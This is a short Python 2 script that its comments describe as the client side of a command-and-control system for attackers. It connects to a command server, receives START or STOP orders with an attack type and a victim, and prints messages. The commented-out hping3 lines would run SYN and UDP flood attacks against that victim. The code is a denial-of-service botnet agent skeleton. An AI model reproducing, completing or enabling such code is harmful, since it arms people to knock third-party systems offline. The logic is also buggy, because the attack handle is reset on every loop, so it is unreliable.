# This will run on every attacker
# This will listen for a message to start (or stop) an attack
# This is essentially sort of a command & control system
import subprocess
import socket

if __name__=='__main__':
	CommandServer = ('127.0.0.1', 666)

	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.connect(CommandServer)
	# Wait for command from command server
	while True:
		data = server.recv(1024)
		command, atkType, victim = data.split('/')

		print command
		print atkType
		print victim

		attack = None

		#Start or stop
		if command == 'START':
			if atkType == 'syn':
				print 'im running a SYN attack!'
				#attack = subprocess.Popen(["hping3","-S","--flood","-V", victim], stdout=subprocess.PIPE)
			elif atkType == 'udp':
				print 'im running a UDP attack!'
				#attack = subprocess.Popen(["hping3", "--flood", "--udp", "p", "666", victim], stdout=subprocess.PIPE)
		elif command == 'STOP':
			if attack != None:
				print 'attack stopped!' 
				#attack.terminate()